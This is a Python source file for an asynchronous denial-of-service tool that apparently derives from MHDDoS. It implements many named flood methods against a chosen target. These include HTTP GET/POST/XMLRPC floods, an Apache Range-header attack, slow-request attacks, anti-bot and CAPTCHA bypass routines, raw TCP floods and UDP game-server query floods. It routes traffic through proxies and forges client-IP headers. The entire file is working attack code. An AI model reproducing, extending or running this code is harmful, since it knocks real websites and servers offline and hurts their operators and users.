import asyncio
import errno
import json
import random
import struct
import time
import uuid
from copy import copy
from dataclasses import dataclass
from functools import partial
from os import urandom as randbytes
from socket import (SO_LINGER, SO_RCVBUF, SOL_SOCKET)
from ssl import CERT_NONE, create_default_context, SSLContext
from typing import Callable, Mapping, Optional, Set, Tuple

import aiohttp
import async_timeout
from aiohttp_socks import ProxyConnector
from OpenSSL import SSL
from requests.structures import CaseInsensitiveDict
from yarl import URL

from . import proxy_proto
from .core import Methods
from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO
from .proxies import ProxySet
from .targets import Target
from .utils import GOSSolver, Templater, Tools
from .vendor.useragents import USERAGENTS


ctx: SSLContext = create_default_context()
ctx.check_hostname = False
try:
    ctx.server_hostname = ""
except AttributeError:
    # Old Python version. SNI might fail even though it's not requested
    # the issue is only fixed in Python3.8+, and the attribute for SSLContext
    # is supported in Python3.7+. With ealier version it's just going
    # to fail
    pass
ctx.verify_mode = CERT_NONE
ctx.set_ciphers("DEFAULT")

trex_ctx = SSL.Context(SSL.TLSv1_2_METHOD)
# Making sure we are using TLS1.2 with RSA cipher suite (key exchange, authentication)
#
# AES256-CCM8             TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM8(256) Mac=AEAD
# AES256-CCM              TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM(256) Mac=AEAD
# ARIA256-GCM-SHA384      TLSv1.2 Kx=RSA      Au=RSA  Enc=ARIAGCM(256) Mac=AEAD
# AES128-GCM-SHA256       TLSv1.2 Kx=RSA      Au=RSA  Enc=AESGCM(128) Mac=AEAD
# AES128-CCM8             TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM8(128) Mac=AEAD
# AES128-CCM              TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM(128) Mac=AEAD
# ARIA128-GCM-SHA256      TLSv1.2 Kx=RSA      Au=RSA  Enc=ARIAGCM(128) Mac=AEAD
# AES256-SHA256           TLSv1.2 Kx=RSA      Au=RSA  Enc=AES(256)  Mac=SHA256
# CAMELLIA256-SHA256      TLSv1.2 Kx=RSA      Au=RSA  Enc=Camellia(256) Mac=SHA256
# AES128-SHA256           TLSv1.2 Kx=RSA      Au=RSA  Enc=AES(128)  Mac=SHA256
# CAMELLIA128-SHA256      TLSv1.2 Kx=RSA      Au=RSA  Enc=Camellia(128) Mac=SHA256
# NULL-SHA256             TLSv1.2 Kx=RSA      Au=RSA  Enc=None      Mac=SHA256
trex_ctx.set_cipher_list(b"RSA")
trex_ctx.set_verify(SSL.VERIFY_NONE, None)


@dataclass
class AttackSettings:
    connect_timeout_seconds: float
    dest_connect_timeout_seconds: float
    drain_timeout_seconds: float
    close_timeout_seconds: float
    http_response_timeout_seconds: float
    tcp_read_timeout_seconds: float
    requests_per_connection: int
    high_watermark: int
    reader_limit: int
    socket_rcvbuf: int
    requests_per_buffer: int

    def with_options(self, **kwargs) -> "AttackSettings":
        settings = copy(self)
        for k, v in kwargs.items():
            if v is not None:
                assert hasattr(settings, k)
                setattr(settings, k, v)

        self.requests_per_buffer = min(self.requests_per_buffer, self.requests_per_connection)
        return settings


class FloodBase:
    def __init__(
        self,
        target: Target,
        method: str,
        url: URL,
        addr: str,
        proxies: ProxySet,
        loop,
        settings: AttackSettings,
        connections: Set[int],
    ):
        self._target = target
        self._method = method
        self._url = url
        self._addr = addr
        self._proxies = proxies
        self._loop = loop
        self._settings = settings
        self._connections = connections

        self._raw_address = (self._addr, (self._url.port or 80))
        self.SENT_FLOOD = getattr(self, self._method)

    @property
    def desc(self) -> Tuple[str, int, str]:
        # Original description
        url = self._target.url
        return url.host, url.port, self._method


class AsyncTcpFlood(FloodBase):

    BASE_HEADERS = {
        "Accept": "*/*",
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'Keep-Alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Pragma': 'no-cache',
    }

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._req_type = (
            "POST" if self._method in {"POST", "STRESS", "XMLRPC"}
            else "HEAD" if self._method in {"HEAD", "RHEAD"}
            else "GET"
        )

    @property
    def is_tls(self):
        return self._url.port == 443

    def default_headers(self) -> dict:
        ip: str = Tools.rand_ipv4()
        origin = str(self._url.origin())
        headers = {
            **self.BASE_HEADERS,
            "Host": self._url.raw_authority,
            "Origin": origin,
            "Referer": origin,  # emulate Referrer-Policy: origin
            "User-Agent": random.choice(USERAGENTS),
            "X-Forwarded-Host": self._url.raw_authority,
            "Via": ip,
            "Client-IP": ip,
            "X-Forwarded-Proto": "https",
            "X-Forwarded-For": ip,
            "Real-IP": ip,
        }
        return headers

    def build_request(self, *, req_type=None, path_qs=None, headers: Optional[Mapping] = None, body=None) -> bytes:
        req_type = req_type or self._req_type
        path_qs = path_qs or self._url.raw_path_qs
        headers = headers or self.default_headers()

        headers = '\r\n'.join(
            f"{key}: {value}"
            for key, value in headers.items()
            if value is not None
        )
        request = (
            f"{req_type} {path_qs} HTTP/1.1\r\n"
            + headers
            + '\r\n\r\n'
        )
        if body:
            request += body
        return request.encode()

    async def run(self, on_connect=None) -> bool:
        try:
            return await self.SENT_FLOOD(on_connect=on_connect)
        except OSError as exc:
            if exc.errno == errno.ENOBUFS:
                await asyncio.sleep(0.1)
                # going to try again, hope device will be ready
                return True
            else:
                raise exc

    async def _generic_flood_proto(
        self,
        payload_type: FloodSpecType,
        payload,
        on_connect: Optional[asyncio.Future],
        num_packets: Optional[int] = None,
    ) -> bool:
        on_close = self._loop.create_future()
        if num_packets is None:
            num_packets = self._settings.requests_per_connection
        flood_proto = partial(
            FloodIO,
            loop=self._loop,
            on_close=on_close,
            settings=self._settings,
            flood_spec=FloodSpec.from_any(
                payload_type, payload, num_packets
            ),
            connections=self._connections,
            on_connect=on_connect,
        )
        server_hostname = "" if self.is_tls else None
        ssl_ctx = ctx if self.is_tls else None
        proxy_url: Optional[str] = self._proxies.pick_random()
        if proxy_url is None:
            conn = self._loop.create_connection(
                flood_proto,
                host=self._addr,
                port=self._url.port,
                ssl=ssl_ctx,
                server_hostname=server_hostname
            )
        else:
            proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
            flood_proto = partial(
                proxy_protocol,
                self._proxies,
                self._loop,
                on_close,
                self._raw_address,
                ssl_ctx,
                downstream_factory=flood_proto,
                connect_timeout=self._settings.dest_connect_timeout_seconds,
                on_connect=on_connect,
            )
            conn = self._loop.create_connection(
                flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)

        return await self._exec_proto(conn, on_connect, on_close)

    async def HTTP_TEMPLATE(self, on_connect=None) -> bool:
        def payload_factory():
            get_opt = self._target.option

            req_type = get_opt('verb')
            raw_path_qs = get_opt('path_qs')
            raw_body = get_opt('body')
            raw_headers = get_opt('headers')
            include_default_headers = get_opt('include_default_headers', True)

            headers = CaseInsensitiveDict(self.default_headers() if include_default_headers else {})
            render_headers = False
            if raw_headers:
                if isinstance(raw_headers, str):
                    render_headers = True
                else:
                    headers.update(raw_headers)

            cache = self._target.cache

            def payload():
                path_qs = None
                if raw_path_qs:
                    path_qs = Templater.render(raw_path_qs, cache)

                if render_headers:
                    parsed = json.loads(Templater.render(raw_headers, cache))
                    headers.update(parsed)

                body = None
                if raw_body:
                    body = Templater.render(raw_body, cache)
                    headers['Content-Length'] = str(len(body))

                return self.build_request(
                    req_type=req_type,
                    path_qs=path_qs,
                    headers=headers,
                    body=body
                )

            return b''.join(payload() for _ in range(self._settings.requests_per_buffer))

        return await self._generic_flood_proto(
            FloodSpecType.CALLABLE,
            payload_factory,
            on_connect,
            self._settings.requests_per_connection // self._settings.requests_per_buffer,
        )

    async def GET(self, on_connect=None) -> bool:
        def payload():
            return self.build_request() * self._settings.requests_per_buffer

        return await self._generic_flood_proto(
            FloodSpecType.BUFFER,
            (payload, self._settings.requests_per_buffer),
            on_connect
        )

    async def RGET(self, on_connect=None) -> bool:
        append = {Tools.rand_str(6): Tools.rand_str(6)}
        payload: bytes = self.build_request(
            path_qs=self._url.update_query(**append).raw_path_qs
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    HEAD = GET
    RHEAD = RGET

    async def POST(self, on_connect=None) -> bool:
        def payload() -> bytes:
            return self.build_request(
                headers={
                    **self.default_headers(),
                    "Content-Length": "44",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/json",
                },
                body='{"data": "%s"}' % Tools.rand_str(32)
            ) * self._settings.requests_per_buffer

        return await self._generic_flood_proto(
            FloodSpecType.BUFFER,
            (payload, self._settings.requests_per_buffer),
            on_connect
        )

    async def STRESS(self, on_connect=None) -> bool:
        def payload() -> bytes:
            return self.build_request(
                headers={
                    **self.default_headers(),
                    "Content-Length": "524",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/json",
                },
                body='{"data": "%s"}' % Tools.rand_str(512)
            ) * self._settings.requests_per_buffer

        return await self._generic_flood_proto(
            FloodSpecType.BUFFER,
            (payload, self._settings.requests_per_buffer),
            on_connect
        )

    async def COOKIE(self, on_connect=None) -> bool:
        cookies = (
            f"_ga=GA{random.randint(1000, 99999)}; "
            f"_gat=1; cfduid={Tools.rand_str(39)}; "
            f"{Tools.rand_str(6)}={Tools.rand_str(32)}"
        )
        payload: bytes = self.build_request(
            headers={
                **self.default_headers(),
                "Cookie": cookies
            }
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def APACHE(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            headers={
                **self.default_headers(),
                "Range": "bytes=0-,%s\r\n" % ",".join("5-%d" % i for i in range(1, 1024))
            }
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def XMLRPC(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            headers={
                **self.default_headers(),
                "Content-Length": "345",
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/xml",
            },
            body=(
                "<?xml version='1.0' encoding='iso-8859-1'?>"
                "<methodCall><methodName>pingback.ping</methodName>"
                f"<params><param><value><string>{Tools.rand_str(64)}</string></value>"
                f"</param><param><value><string>{Tools.rand_str(64)}</string>"
                "</value></param></params></methodCall>"
            )
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def PPS(self, on_connect=None) -> bool:
        payload = self.build_request(headers={"Host": self._url.raw_authority})
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def DYN(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            headers={
                **self.default_headers(),
                "Host": "%s.%s" % (Tools.rand_str(6), self._url.raw_authority)
            }
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def NULL(self, on_connect=None) -> bool:
        payload: bytes = self.build_request(
            headers={
                **self.default_headers(),
                "User-Agent": "null",
                "Referer": "null",
            }
        )
        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)

    async def BYPASS(self, on_connect=None) -> bool:
        connector = self._proxies.pick_random_connector()
        packets_sent = 0
        cl_timeout = aiohttp.ClientTimeout(connect=self._settings.connect_timeout_seconds)
        async with aiohttp.ClientSession(connector=connector, timeout=cl_timeout) as s:
            for _ in range(self._settings.requests_per_connection):
                async with s.get(str(self._url)) as response:
                    if on_connect and not on_connect.done():
                        on_connect.set_result(True)
                    packets_sent += 1
                    # XXX: we need to track in/out traffic separately
                    async with async_timeout.timeout(self._settings.http_response_timeout_seconds):
                        await response.read()
        return packets_sent > 0

    async def GOSPASS(self, on_connect=None) -> bool:
        solver = GOSSolver()
        packets_sent = 0
        user_agent = random.choice(USERAGENTS)
        proxy_url = self._proxies.pick_random()
        if proxy_url is None:
            connector, proxy_ip = None, solver.OWN_IP_KEY
        else:
            connector = ProxyConnector.from_url(proxy_url, ssl=False)
            # we always replace proxy host with resolved addr
            proxy_ip = URL(proxy_url).host
        req_timeout = self._settings.http_response_timeout_seconds
        cl_timeout = aiohttp.ClientTimeout(
            connect=self._settings.connect_timeout_seconds, total=30)
        conn_id = hash(uuid.uuid4())
        headers = {
            **self.BASE_HEADERS,
            "User-Agent": user_agent,
        }
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=cl_timeout,
        ) as s:
            try:
                cached_cookies = solver.lookup(solver.DEFAULT_A, proxy_ip)
                if cached_cookies is None:
                    # there's certainly a race condition here between us looking up
                    # in the dictionary and tasks are already running to fetch challenge
                    # we are okay though as the challenge itself is stateless with
                    # respect to only a few parameters we control for
                    async with s.get(
                        solver.path,
                        headers=headers,
                    ) as response:
                        payload = dict(await response.json())
                        if "cn" not in payload:
                            raise RuntimeError("Invalid challenge payload")
                    (latest_ts, cookies) = solver.solve(user_agent, payload, cache_key=proxy_ip)
                    self._connections.add(conn_id)
                else:
                    (latest_ts, user_agent, cookies) = cached_cookies
                    headers["User-Agent"] = user_agent
                s.cookie_jar.update_cookies(cookies)
                for ind in range(solver.MAX_RPC):
                    if time.time() > latest_ts:
                        break
                    async with s.get(
                        str(self._url),
                        headers=headers,
                    ) as response:
                        self._connections.add(conn_id)
                        if on_connect and not on_connect.done():
                            on_connect.set_result(True)
                        packets_sent += 1
                        async with async_timeout.timeout(req_timeout):
                            body = await response.read()
                            if not solver.bypass(body):
                                break
                    await asyncio.sleep(1.0)
            finally:
                self._connections.discard(conn_id)
        return packets_sent > 0

    async def CFB(self, on_connect=None) -> bool:
        packet: bytes = self.build_request()

        def _gen():
            yield FloodOp.WRITE, packet
            yield FloodOp.SLEEP, 5.01
            deadline = time.time() + 120
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, packet
                if time.time() > deadline:
                    return

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def EVEN(self, on_connect=None) -> bool:
        packet: bytes = self.build_request()

        def _gen():
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, packet
                # XXX: have to setup buffering properly for this attack to be effective
                yield FloodOp.READ, 1

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def AVB(self, on_connect=None) -> bool:
        packet: bytes = self.build_request()

        def _gen():
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.SLEEP, 1
                yield FloodOp.WRITE, packet

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def SLOW(self, on_connect=None) -> bool:
        packet: bytes = self.build_request()[:-3]

        def _gen():
            yield FloodOp.WRITE, packet

            for _ in range(self._settings.requests_per_connection):
                keep_alive = b"\nX-a: %d\r" % random.randint(1, 1000000)
                yield FloodOp.WRITE, keep_alive
                yield FloodOp.SLEEP, random.randint(10, 15)

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def DOWNLOADER(self, on_connect=None) -> bool:
        packet: bytes = self.build_request()

        def _gen():
            yield FloodOp.WRITE, packet

            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.SLEEP, 0.1
                yield FloodOp.READ, 1
                # XXX: how to detect EOF here?
                #      the problem with such attack is that if we already got
                #      EOF, there's no need to perform any other operations
                #      within range(_) loop. original code from MHDDOS seems to
                #      be broken on the matter:
                #      https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L910

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def TCP(self, on_connect=None) -> bool:
        packet_size = 1024 * self._settings.requests_per_buffer
        return await self._generic_flood_proto(
            FloodSpecType.BUFFER,
            (partial(randbytes, packet_size), self._settings.requests_per_buffer),
            on_connect
        )

    async def RHEX(self, on_connect=None) -> bool:
        # XXX: not sure if this is gonna be a proper "hex". maybe we need
        #      to do a hex here instead of just wrapping into str
        randhex: str = str(randbytes(random.choice([32, 64, 128])))
        packet = self.build_request(
            path_qs=f'{self._url.raw_authority}/{randhex}',
            headers={
                **self.default_headers(),
                "Host": f"{self._url.raw_authority}/{randhex}"
            }
        )

        return await self._generic_flood_proto(FloodSpecType.BYTES, packet, on_connect)

    async def STOMP(self, on_connect=None) -> bool:
        # XXX: why r'' string? Why space at the end?
        hexh = (
            r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87'
            r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F'
            r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F'
            r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84'
            r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F'
            r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98'
            r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98'
            r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B'
            r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99'
            r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C'
            r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
        )

        p1: bytes = self.build_request(
            path_qs=f'{self._url.raw_authority}/{hexh}',
            headers={
                **self.default_headers(),
                "Host": f"{self._url.raw_authority}/{hexh}"
            }
        )
        p2: bytes = self.build_request(
            path_qs=f'{self._url.raw_authority}/cdn-cgi/l/chk_captcha',
            headers={
                **self.default_headers(),
                "Host": hexh,
            }
        )

        def _gen():
            yield FloodOp.WRITE, p1
            for _ in range(self._settings.requests_per_connection):
                yield FloodOp.WRITE, p2

        return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)

    async def TREX(self, on_connect=None) -> bool:
        on_close = self._loop.create_future()

        trex_proto = partial(
            TrexIO,
            trex_ctx,
            self._settings.requests_per_connection,
            self._loop,
            on_connect,
            on_close
        )
        proxy_url: Optional[str] = self._proxies.pick_random()
        if proxy_url is None:
            addr, port = self._raw_address
            conn = self._loop.create_connection(trex_proto, host=addr, port=port, ssl=None)
        else:
            proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
            trex_proto = partial(
                proxy_protocol,
                self._loop,
                on_close,
                self._raw_address,
                None,
                downstream_factory=trex_proto,
                connect_timeout=self._settings.dest_connect_timeout_seconds,
                on_connect=self._loop.create_future()  # as we don't want it to fire too early
            )
            conn = self._loop.create_connection(
                trex_proto, host=proxy.proxy_host, port=proxy.proxy_port, ssl=None)

        return await self._exec_proto(conn, on_connect, on_close)

    async def _exec_proto(self, conn, on_connect, on_close) -> bool:
        transport = None
        try:
            async with async_timeout.timeout(self._settings.connect_timeout_seconds):
                transport, _ = await conn
            sock = transport.get_extra_info("socket")
            if sock and hasattr(sock, "setsockopt"):
                sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
                # the normal termination sequence SHOULD NOT to be initiated
                sock.setsockopt(SOL_SOCKET, SO_LINGER, struct.pack("ii", 1, 0))
        except asyncio.CancelledError as e:
            if on_connect:
                on_connect.cancel()
            on_close.cancel()
            raise e
        except Exception as e:
            if on_connect:
                on_connect.set_exception(e)
            raise e
        else:
            return bool(await on_close)
        finally:
            if transport:
                transport.abort()


class AsyncUdpFlood(FloodBase):
    async def run(self) -> bool:
        return await self.SENT_FLOOD()

    async def _generic_flood(self, packet_gen: Callable[[], Tuple[bytes, int]]) -> bool:
        on_close = self._loop.create_future()
        transport = None
        async with async_timeout.timeout(self._settings.connect_timeout_seconds):
            transport, _ = await self._loop.create_datagram_endpoint(
                partial(DatagramFloodIO, self._loop, packet_gen, on_close),
                remote_addr=self._raw_address
            )
        try:
            return bool(await on_close)
        finally:
            if transport:
                transport.close()

    async def UDP(self) -> bool:
        packet_size = 1024
        return await self._generic_flood(lambda: (randbytes(packet_size), packet_size))

    async def VSE(self) -> bool:
        packet: bytes = (
            b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
            b'\x20\x51\x75\x65\x72\x79\x00'
        )
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))

    async def FIVEM(self) -> bool:
        packet: bytes = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))

    async def TS3(self) -> bool:
        packet = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))

    async def MCPE(self) -> bool:
        packet: bytes = (
            b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
            b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
            b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
            b'\x73'
        )
        packet_size = len(packet)
        return await self._generic_flood(lambda: (packet, packet_size))


def main(target, method, proxies, loop, settings, connections):
    (url, ip), proxies = Tools.parse_params(target, proxies)
    if method in {*Methods.HTTP_METHODS, *Methods.TCP_METHODS}:
        flood_cls = AsyncTcpFlood
    elif method in Methods.UDP_METHODS:
        flood_cls = AsyncUdpFlood
    else:
        raise RuntimeError(f'Invalid method {target.method}')

    return flood_cls(
        target,
        method,
        url,
        ip,
        proxies,
        loop=loop,
        settings=settings,
        connections=connections,
    )
